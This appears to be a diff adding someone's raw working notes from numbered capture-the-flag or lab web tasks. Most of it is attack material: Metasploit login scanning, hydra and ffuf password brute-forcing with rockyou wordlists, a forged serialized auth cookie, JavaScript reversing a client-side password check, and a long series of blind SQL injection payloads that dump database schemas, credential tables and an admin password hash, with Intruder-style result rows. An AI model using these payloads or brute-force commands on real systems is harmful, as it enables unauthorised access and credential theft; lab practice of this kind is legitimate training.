@@ -1,0 +1,288 @@
+45
+msconsole
+
+use auxiliary/scanner/http/http_login
+
+search http_login
+
+use 3
+info 3
+
+
+47
+
+ffuf -u http://10.8.32.1:42791 -X POST -d "login=FFUZ1&passwd=FUZZ" -w /usr/share/wordlists/rockyou.txt:FUZZ -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -fs 821
+hydra -P /usr/share/wordlists/rockyou.txt 10.8.32.1 -s 42791 http-form-post "/:login=^USER^&passwd=^PASS^:Wrong login/password" -l /usr/share/seclists/Usernames/top-usernames-shortlist.txt -f
+└─$ hydra -P /usr/share/wordlists/rockyou.txt 10.8.32.1 -s 42792 http-form-post "/:login=^USER^&passwd=^PASS^:Wrong login/password" -l root -f        
+└─$ hydra -P /usr/share/wordlists/rockyou.txt 10.8.32.1 -s 42792 http-form-post "/:login=^USER^&passwd=^PASS^:Wrong login/password" -l /usr/share/seclists/Usernames/Names/names.txt -f
+└─$ ffuf -u http://10.8.32.1:42792 -X POST -d "login=root&passwd=FUZZ" -w /usr/share/seclists/Passwords/darkweb2017-top10000.txt:FUZZ -fs 821
+
+
+48
+Auth: a:2:{s:5:"login"%3bb:1%3bs:6:"passwd"%3bb:1%3b}
+
+49
+00000011111!!!!!!!!!!.!!!.!..!!!!!!!!!.....!.!.!!!!!!!......!.!!!!!!!!....!.!..!!!!!!.!!.!....!!!!!!!!!...!!...!!!!!!.!!!.!!...!!!!!!!......!.!!!!!!!.!!.!!!.!.!!!!!!!..!..!.!!!!!!!!!.!.!!!..!!!!!!!!..!!.!!!.!!!!!!!..!.!!.!.!!!!!!!!.....!..!!!!!!!!....!!!.!!!!!!!!....!..!!
+
+'99' -> ASCII: 'c'
+'111' -> ASCII: 'o'
+'100' -> ASCII: 'd'
+'101' -> ASCII: 'e'
+'98' -> ASCII: 'b'
+'121' -> ASCII: 'y'
+'46' -> ASCII: '.'
+'110' -> ASCII: 'n'
+'101' -> ASCII: 'e'
+'116' -> ASCII: 't'
+'87' -> ASCII: 'W'
+'65' -> ASCII: 'A'
+'80' -> ASCII: 'P'
+'84' -> ASCII: 'T'
+'50' -> ASCII: '2'
+'48' -> ASCII: '0'
+'49' -> ASCII: '1'
+'57' -> ASCII: '9'
+
+// Online Javascript Editor for free
+// Write, Edit and Run your Javascript code using JS Online Compiler
+
+console.log("Welcome to Programiz!");
+var s = '!!!!!!.....!!!!!!!!!!.!!!.!..!!!!!!!!!.....!.!.!!!!!!!......!.!!!!!!!!....!.!..!!!!!!.!!.!....!!!!!!!!!...!!...!!!!!!.!!!.!!...!!!!!!!......!.!!!!!!!.!!.!!!.!.!!!!!!!..!..!.!!!!!!!!!.!.!!!..!!!!!!!!..!!.!!!.!!!!!!!..!.!!.!.!!!!!!!!.....!..!!!!!!!!....!!!.!!!!!!!!....!..!!!!!!!!.!!!....!!'
+
+var a = s.split('').map(function(e7){
+                if (e7 === '.') {
+                        return '1';
+                }else{
+                        return '0';
+                }
+        }).join('');
+console.log(a);
+
+var b = splitStringIntoChunks(a);
+console.log(b);
+
+var c =  reverseBinaryToDecimal(b)
+console.log(c);
+
+var d = undoOperation(c)
+console.log(d);
+
+var e =  reverseBinaryToDecimal(d)
+console.log(e);
+
+function undoOperation(array) {
+  const originalArray = array.map(e3 => {
+    const binaryValue = (e3 - parseInt('10', 2)).toString(2);
+    return binaryValue;
+  });
+
+  return originalArray;
+}
+
+function splitStringIntoChunks(str) {
+  const chunkSize = 16;
+  const chunks = [];
+
+  for (let i = 0; i < str.length; i += chunkSize) {
+    chunks.push(str.substr(i, chunkSize));
+  }
+
+  return chunks;
+}
+
+function reverseBinaryToDecimal(binaryArray) {
+  const decimalArray = binaryArray.map(binaryStr => parseInt(binaryStr, 2));
+  const originalArray = decimalArray.map(decimal => decimal.toString(10));
+  return originalArray;
+}
+/*function check(login, passwd){
+
+        let s = (login + passwd).split('').map(function(e1){
+                return e1.charCodeAt(0);
+        }).map(function(e2){
+                return e2.toString();
+        }).map(function(e3){
+                return e3 + parseInt('10',2);
+        }).map(function(e4){
+                var e3 = "%&" & 1;
+                return parseInt(e4).toString(2);
+        }).map(function(e5){
+                if (e5.length < 16) {
+                        i = 0;
+                        while(i < (16 - e5.length)){
+                                e5 = '0' + e5;
+                        }
+                }
+
+                return e5;
+        }).map(function(e6){
+                r = '';
+                for(i = 0; i < e6.length; i++){
+                        if (e6[i] === '0') {
+                                r += '1';
+                        }else{
+                                r += '0';
+                        }
+                }
+
+                return r;
+        }).join('').split('').map(function(e7){
+                if (e7 === '0') {
+                        return '.';
+                }else{
+                        return '!';
+                }
+        }).join('');
+
+
+        if (s === '!!!!!!.....!!!!!!!!!!.!!!.!..!!!!!!!!!.....!.!.!!!!!!!......!.!!!!!!!!....!.!..!!!!!!.!!.!....!!!!!!!!!...!!...!!!!!!.!!!.!!...!!!!!!!......!.!!!!!!!.!!.!!!.!.!!!!!!!..!..!.!!!!!!!!!.!.!!!..!!!!!!!!..!!.!!!.!!!!!!!..!.!!.!.!!!!!!!!.....!..!!!!!!!!....!!!.!!!!!!!!....!..!!!!!!!!.!!!....!!')*/
+
+
+50
+
+login=admin'#
+
+SCHEMA_NAME,3 FROM INFORMATION_SCHEMA.SCHEMATA
+TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
+
+login=admin' and ASCII(substring((select schema_name from information_schema.schemata limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+information_schema
+AUTH
+mysql
+3 mysql_admin_cred
+4 performance_schema
+
+
+login=admin' and ASCII(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+users
+
+mysql_admin_cred admin	
+
+mysql_admin_cred passwords
+
+login=admin' and ASCII(substring((select column_name from information_schema.columns where table_name='admin' and table_schema='mysql_admin_cred' limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+id
+user
+
+login=admin' and ASCII(substring((select column_name from information_schema.columns where table_name='passwords' and table_schema='mysql_admin_cred' limit 1,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+id
+ipd
+pid
+passwd
+
+login=admin' and ASCII(substring((select "id" from mysql_admin_cred.admin limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+0 id
+0 user
+
+
+login=admin' and ASCII(substring((select "ipd" from mysql_admin_cred.passwords limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+id
+ipd
+pid
+passwd
+
+dXNlcg==
+dXNlcg==
+
+
+$user =dXNlcg==;
+$passwd = passwd;
+$query = "SELECT (SELECT passwd FROM passwords WHERE pid = (SELECT id FROM admin WHERE user = '".base64_decode($user)."')) as PW;";
+$result = mysqli_query($link, $query) or die('<pre>Error connect</pre>');
+
+while( $row = mysqli_fetch_assoc( $result ) ) {
+	if($passwd != '' && $passwd == $row['PW']){
+		echo "cdb{".md5($row['PW'] + base64_decode($user))."}";
+        }
+}
+
+online php:
+
+<?php
+$user ="dXNlcg==";
+$passwd = "passwd";
+$query = "SELECT (SELECT passwd FROM passwords WHERE pid = (SELECT id FROM admin WHERE user = '".base64_decode($user)."')) as PW;";
+
+echo "cdb{".md5($row['PW'] + base64_decode($user))."}";
+
+?>
+
+
+login=admin' and ASCII(substring((select column_name from information_schema.columns where table_name='users' limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+id
+login
+passwd
+USER
+CURRENT
+TOTAL
+
+login=admin' and ASCII(substring((select iD from users limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+1
+
+login=admin' and ASCII(substring((select login from users limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+id 
+1
+
+login
+admin
+
+passwd 32 simbols
+
+fd9d7b3faa2065c73582c780f9b595d5
+
+19	27	b	200	false	false	1012	
+25	21	c	200	false	false	1012	
+47	31	d	200	false	false	1012	
+65	25	f	200	false	false	1012	
+
+9	9	a	200	false	false	1012	
+10	10	a	200	false	false	1012	
+16	6	b	200	false	false	1012	
+32	2	d	200	false	false	1012	
+34	4	d	200	false	false	1012	
+51	1	f	200	false	false	1012	
+58	8	f	200	false	false	1012	
+557	7	3	200	false	false	1012	
+595	5	7	200	false	false	1012	
+613	3	9	200	false	false	1012			
+
+25	15	c	200	false	false	1012	
+541	11	2	200	false	false	1012	
+550	20	2	200	false	false	1012	
+557	17	3	200	false	false	1012	
+574	14	5	200	false	false	1012	
+578	18	5	200	false	false	1012	
+583	13	6	200	false	false	1012	
+596	16	7	200	false	false	1012	
+609	19	8	200	false	false	1012	
+622	12	0	200	false	false	1012	
+	
+93	28	5	200	false	false	1012	
+95	30	5	200	false	false	1012		
+125	22	7	200	false	false	1012	
+145	23	8	200	false	false	1012	
+167	26	9	200	false	false	1012	
+170	29	9	200	false	false	1012		
+
+60	32	5	200	false	false	1012	
+112	24	0	200	false	false	1012	
+
+login=admin' and ASCII(substring((select "TOTAL" from users limit 0,1),§1§,1))=ASCII('§Q§') #&passwd=12345
+
+USER
+USER
+
+CURRENT
+CURRENT
+
+TOTAL
+TOTAL
+
